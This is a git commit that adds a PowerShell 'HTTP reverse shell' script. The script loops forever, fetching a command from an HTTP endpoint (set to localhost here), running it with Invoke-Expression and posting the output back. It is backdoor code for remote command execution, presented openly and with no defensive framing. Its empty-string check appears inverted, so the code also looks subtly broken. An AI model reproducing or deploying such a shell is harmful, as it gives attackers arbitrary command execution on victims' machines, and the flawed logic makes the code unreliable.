48db7fca808a69b1c000b16789faed37c41f9353
Ashish D'Souza <sudouser512@gmail.com>
2020-08-05 11:59:01 -0400

    Created PowerShell HTTP Reverse Shell Code

--- src/powershell/http_reverse_shell.ps1
+++ src/powershell/http_reverse_shell.ps1
@@ -1,2 +1,7 @@
 While(1) {
+    $c = (Invoke-WebRequest localhost/http_reverse_shell/?ready=true).Content
+    If($c -eq '') {
+        Invoke-WebRequest localhost/http_reverse_shell/ -Method Post -Body @{'stdout' = iex $c}
+    }
+    sleep 3
 }
